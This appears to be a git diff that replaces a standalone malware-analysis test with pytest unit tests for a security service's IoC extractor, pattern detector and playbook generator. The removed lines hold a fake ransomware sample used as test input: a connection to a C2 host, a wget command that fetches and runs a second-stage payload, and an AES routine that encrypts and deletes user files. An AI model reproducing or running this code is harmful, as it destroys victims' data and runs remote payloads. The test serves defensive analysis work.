@@ -1,56 +1,92 @@
+"""Maximus Eureka Service - Test Eureka.
+
+This module contains unit tests for the Maximus AI's Eureka Service. It ensures
+that the Eureka Engine, Pattern Detector, IoC Extractor, and Playbook Generator
+components function as expected, correctly identifying insights, patterns,
+extracting indicators, and generating appropriate response playbooks.
+
+These tests cover various aspects of data analysis, pattern recognition,
+IoC extraction logic, and playbook generation rules, validating the robustness
+and accuracy of the Eureka Service's discovery capabilities.
 """
-EUREKA - Teste Standalone
-Demonstra análise completa de malware
-"""
 
-from eureka import Eureka
-from pathlib import Path
+import pytest
+from unittest.mock import AsyncMock, MagicMock
+from maximus_eureka.eureka import EurekaEngine
+from maximus_eureka.pattern_detector import PatternDetector
+from maximus_eureka.ioc_extractor import IoCExtractor
+from maximus_eureka.playbook_generator import PlaybookGenerator
 
-# Criar arquivo de teste com código malicioso
-test_file = Path("/tmp/fake_ransomware.py")
-test_file.write_text("""
-import socket
-import os
-import subprocess
-import base64
-from Crypto.Cipher import AES
+@pytest.fixture
+def eureka_engine():
+    """Fixture for EurekaEngine."""
+    return EurekaEngine()
 
-# Command & Control
-C2_SERVER = "evil-c2.darkweb.onion"
-C2_PORT = 4444
+@pytest.fixture
+def pattern_detector():
+    """Fixture for PatternDetector."""
+    return PatternDetector()
 
-def connect_c2():
-    '''Connect to C2 server'''
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((C2_SERVER, C2_PORT))
-    return sock
+@pytest.fixture
+def ioc_extractor():
+    """Fixture for IoCExtractor."""
+    return IoCExtractor()
 
-def download_stage2():
-    '''Download second stage payload'''
-    os.system("wget http://malicious-cdn.com/stage2.exe")
-    subprocess.Popen(["chmod", "+x", "stage2.exe"])
-    subprocess.Popen(["./stage2.exe"])
+@pytest.fixture
+def playbook_generator():
+    """Fixture for PlaybookGenerator."""
+    return PlaybookGenerator()
 
-def encrypt_user_files():
-    '''Ransomware encryption routine'''
-    key = os.urandom(32)
-    cipher = AES.new(key, AES.MODE_EAX)
-    
-    target_dirs = ["/home", "/Documents", "/Desktop"]
-    
-    for directory in target_dirs:
-        for root, dirs, files in os.walk(directory):
-            for filename in files:
-                filepath = os.path.join(root, filename)
-                try:
-                    with open(filepath, 'rb') as f:
-                        data = f.read()
-                    encrypted = cipher.encrypt(data)
-                    with open(filepath + '.locked', 'wb') as f:
-                        f.write(encrypted)
-                    os.remove(filepath)
-                except:
-                    pass
+@pytest.mark.asyncio
+async def test_eureka_engine_no_novel_discovery(eureka_engine):
+    """Tests EurekaEngine when no novel discovery is made."""
+    data = {"log": "normal activity"}
+    result = await eureka_engine.analyze_data(data, "logs")
+    assert result["status"] == "completed"
+    assert "No significant novel insights" in result["analysis_notes"]
+    assert result["novel_discovery"] is None
 
-def display_ransom_note():
-    note = base64.b64decode("WW91ciBmaWxlcyBoYXZlIGJlZW
+@pytest.mark.asyncio
+async def test_eureka_engine_novel_discovery(eureka_engine):
+    """Tests EurekaEngine when a novel discovery is made."""
+    data = {"network_traffic": "unusual_pattern_zero_day_exploit"}
+    result = await eureka_engine.analyze_data(data, "network_traffic")
+    assert result["status"] == "completed"
+    assert "Critical novel discovery made!" in result["analysis_notes"]
+    assert result["novel_discovery"] is not None
+    assert result["novel_discovery"]["severity"] == "critical"
+
+def test_ioc_extractor_extract_ips(ioc_extractor):
+    """Tests IoCExtractor for IP address extraction."""
+    data = {"log_entry": "Connection from 192.168.1.10 to 10.0.0.5"}
+    iocs = ioc_extractor.extract_iocs(data)
+    assert "192.168.1.10" in iocs["ips"]
+    assert "10.0.0.5" in iocs["ips"]
+
+def test_ioc_extractor_extract_domains(ioc_extractor):
+    """Tests IoCExtractor for domain extraction."""
+    data = {"url": "http://malicious.com/phish?user=test", "domain": "legit-site.org"}
+    iocs = ioc_extractor.extract_iocs(data)
+    assert "malicious.com" in iocs["domains"]
+    assert "legit-site.org" in iocs["domains"]
+
+def test_pattern_detector_high_cpu_anomaly(pattern_detector):
+    """Tests PatternDetector for high CPU anomaly detection."""
+    data = {"cpu_usage": 95, "memory_usage": 50}
+    pattern_def = {"type": "statistical", "metric": "cpu_usage"}
+    detected = pattern_detector.detect_patterns(data, pattern_def)
+    assert len(detected) == 1
+    assert detected[0]["pattern_id"] == "high_cpu_anomaly"
+
+def test_playbook_generator_critical_insight(playbook_generator):
+    """Tests PlaybookGenerator for critical insight playbook generation."""
+    insight = {
+        "id": "exploit_001",
+        "type": "zero_day_exploit_potential",
+        "severity": "critical",
+        "description": "New exploit found",
+        "related_data": {"host": "server_1"}
+    }
+    playbook = playbook_generator.generate_playbook(insight)
+    assert playbook["name"] == "Response to zero_day_exploit_potential"
+    assert any("isolate_affected_systems" == step["action"] for step in playbook["steps"])
